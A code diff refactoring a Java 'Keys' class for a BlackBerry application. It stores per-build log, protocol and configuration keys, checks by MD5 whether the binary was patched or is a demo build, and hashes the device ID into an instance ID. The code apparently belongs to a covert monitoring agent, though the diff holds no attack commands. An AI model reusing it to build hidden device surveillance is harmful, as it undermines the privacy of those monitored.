@@ -8,33 +8,46 @@
  * *************************************************/
 package blackberry.config;
 
-import net.rim.device.api.system.RuntimeStore;
+import net.rim.device.api.crypto.MD5Digest;
+import net.rim.device.api.util.Arrays;
 import blackberry.Device;
+import blackberry.Singleton;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.interfaces.Singleton;
+import blackberry.interfaces.iSingleton;
+import fake.InstanceKeysFake;
 
 /**
  * The Class Keys.
  */
-public final class Keys implements Singleton {
+public final class Keys implements iSingleton {
 
     //#ifdef DEBUG
-    static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("Keys", DebugLevel.VERBOSE);
     //#endif
 
     InstanceKeys instanceKeys;
 
     static private Keys instance = null;
-    private static final long GUID = 0x6b3d91c714d645e7L;
+    private static final long GUID = 0x6b3391c7148645b7L;
 
-    /*
-     * private static byte[] byteAesKey; private static byte[] byteChallengeKey;
-     * private static byte[] byteConfKey; private static byte[] byteBuildID;
-     */
-    private static byte[] byteInstanceID;
+    protected byte[] byteLogKey;
+    protected byte[] byteProtoKey;
+    protected byte[] byteConfKey;
+    protected byte[] byteBuildID;
+    //private static byte[] byteInstanceID;
+    private byte[] byteInstanceID;
+
+    private static byte[] buildDigest = new byte[] { (byte) 0x7f, (byte) 0x9e,
+            (byte) 0x6a, (byte) 0xe, (byte) 0xd9, (byte) 0x96, (byte) 0x54,
+            (byte) 0x58, (byte) 0xd8, (byte) 0xc1, (byte) 0xf1, (byte) 0xa5,
+            (byte) 0x58, (byte) 0x71, (byte) 0x3e, (byte) 0x9d };
+    private static byte[] demoDigest = new byte[] { (byte) 0xba, (byte) 0xba,
+            (byte) 0x73, (byte) 0xe6, (byte) 0x7e, (byte) 0x39, (byte) 0xdb,
+            (byte) 0x5d, (byte) 0x94, (byte) 0xf3, (byte) 0xc6, (byte) 0x7a,
+            (byte) 0x58, (byte) 0xd5, (byte) 0x2c, (byte) 0x52 };
 
     //#ifdef DEBUG
     public String log = "";
@@ -46,32 +59,45 @@ public final class Keys implements Singleton {
      * 
      * @return single instance of Keys
      */
-    public static synchronized Keys getInstance(
-            InstanceKeysEmbedded instanceKeyEmbedded) {
-        if (instance == null) {
+    private static synchronized Keys getInstance(
+            InstanceKeysFake instanceKeyEmbedded) {
+        boolean fake = false;
+        //#ifdef FAKECONF
+        fake = true;
+        //#endif
 
-            instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
+        if (!isInstanced() || instance.getLogKey() == null) {
+            instance = (Keys) Singleton.self().get(GUID);
             if (instance == null) {
-                final Keys singleton = new Keys();
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
-                instance = singleton;
-                
+                instance = new Keys();
+
+                if (fake) {
+                    //#ifdef DBC
+                    Check.asserts(instanceKeyEmbedded != null,
+                            "Null instanceKeyEmbedded");
+                    //#endif
+                }
+
+                if (instanceKeyEmbedded != null) {
+                    instance.setKeys(instanceKeyEmbedded);
+                }
+
+                Singleton.self().put(GUID, instance);
             }
         }
-        //#ifdef FAKECONF
-        if (instanceKeyEmbedded != null) {
-            instance.setInstanceKeys(instanceKeyEmbedded);
-        }
-        //#endif
 
         //#ifdef DBC
-        Check.ensures(instance.getAesKey() != null, "Null AESKEY");
+        Check.ensures(instance.getLogKey() != null, "Null LOGKEY");
         //#endif
-        
+
         return instance;
     }
 
-    public static synchronized Keys getInstance() {
+    public static Keys getFakeInstance(InstanceKeysFake instance) {
+        return getInstance(instance);
+    }
+
+    public static Keys getInstance() {
         return getInstance(null);
     }
 
@@ -85,45 +111,54 @@ public final class Keys implements Singleton {
      * @return true, if successful
      */
     public boolean hasBeenBinaryPatched() {
-        return instanceKeys.hasBeenBinaryPatched();
+        //boolean ret = !buildID.startsWith("av3pVck1gb4eR");
+        MD5Digest digest = new MD5Digest();
+        digest.update(instanceKeys.getBuildID());
+        byte[] calculated = digest.getDigest();
+        boolean ret = !Arrays.equals(calculated, buildDigest);
+        //#ifdef FAKECONF
+        ret = true;
+        //#endif
+
+        return ret;
+    }
+
+    /**
+     * Checks if demo.
+     * 
+     * @return true, if successful
+     */
+    public boolean isDemo() {
+        MD5Digest digest = new MD5Digest();
+        digest.update(instanceKeys.getDemo());
+        byte[] calculated = digest.getDigest();
+        boolean ret = Arrays.equals(calculated, demoDigest);
+        //#ifdef NODEMO
+        ret = false;
+        //#endif
+
+        return ret;
     }
 
     private Keys() {
-        final Device device = Device.getInstance();
         instanceKeys = new InstanceKeys();
-
-        //device.refreshData();
-        final byte[] deviceid = device.getWDeviceId();
-        byteInstanceID = Encryption.SHA1(deviceid);
+        setKeys(instanceKeys);
     }
 
-    private void setInstanceKeys(InstanceKeysEmbedded instance) {
-        //instanceKeys = new InstanceKeys();
-        //#ifdef FAKECONF
-        if (!hasBeenBinaryPatched()) {
-            if (instance != null) {
-                instance.injectKeys(instanceKeys);
-            }
-        }
-        //#endif  
+    private void setKeys(KeysGetter instanceKeys) {
+        byteLogKey = Arrays.copy(instanceKeys.getLogKey(), 0, 16);
+        byteProtoKey = Arrays.copy(instanceKeys.getProtoKey(), 0, 16);
+        byteConfKey = Arrays.copy(instanceKeys.getConfKey(), 0, 16);
+        byteBuildID = instanceKeys.getBuildID();
     }
-
-    /*
-     * private void setInstanceKeys() { byteAesKey = instanceKeys.getAesKey();
-     * byteChallengeKey = instanceKeys.getChallengeKey(); byteConfKey =
-     * instanceKeys.getConfKey(); byteBuildID = instanceKeys.getBuildId();
-     * //#ifdef DEBUG debug.trace("instanceKeys log:" + InstanceKeys.log);
-     * //#endif }
-     */
 
     /**
      * Gets the aes key.
      * 
      * @return the aes key
      */
-    public byte[] getAesKey() {
-        return instanceKeys.getAesKey();
-
+    public byte[] getLogKey() {
+        return byteLogKey;
     }
 
     /**
@@ -131,8 +166,8 @@ public final class Keys implements Singleton {
      * 
      * @return the builds the id
      */
-    public byte[] getBuildId() {
-        return instanceKeys.getBuildId();
+    public byte[] getBuildID() {
+        return byteBuildID;
     }
 
     /**
@@ -140,8 +175,8 @@ public final class Keys implements Singleton {
      * 
      * @return the challenge key
      */
-    public byte[] getChallengeKey() {
-        return instanceKeys.getChallengeKey();
+    public byte[] getProtoKey() {
+        return byteProtoKey;
     }
 
     /**
@@ -150,7 +185,7 @@ public final class Keys implements Singleton {
      * @return the conf key
      */
     public byte[] getConfKey() {
-        return instanceKeys.getConfKey();
+        return byteConfKey;
     }
 
     /**
@@ -159,6 +194,11 @@ public final class Keys implements Singleton {
      * @return the instance id
      */
     public byte[] getInstanceId() {
+        if (byteInstanceID == null) {
+            final Device device = Device.getInstance();
+            final byte[] deviceid = device.getWDeviceId();
+            byteInstanceID = Encryption.SHA1(deviceid);
+        }
         return byteInstanceID;
     }
 
